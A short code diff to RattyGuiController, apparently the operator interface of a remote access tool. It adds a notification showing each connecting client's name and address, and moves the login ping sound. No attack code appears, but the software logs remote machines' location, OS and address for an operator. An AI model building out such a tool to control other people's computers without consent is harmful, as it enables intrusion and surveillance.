@@ -421,11 +421,16 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String location = packet.getLocation();
 		final String os = packet.getOs();
 		final String version = packet.getVersion();
+		final String address = client.getAddress();
+		final Notification notification = new Notification(name + " " + address);
 		
 		client.logIn(name, location, os, version);
 		client.addListener(this);
 		
 		gui.addRow(client);
+		
+		notification.trigger();
+		PING.play();
 	}
 	
 	@Override
@@ -453,8 +458,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 		super.connected(server, connection);
 		
 		clients.put(connection, client);
-		
-		PING.play();
 	}
 	
 	@Override
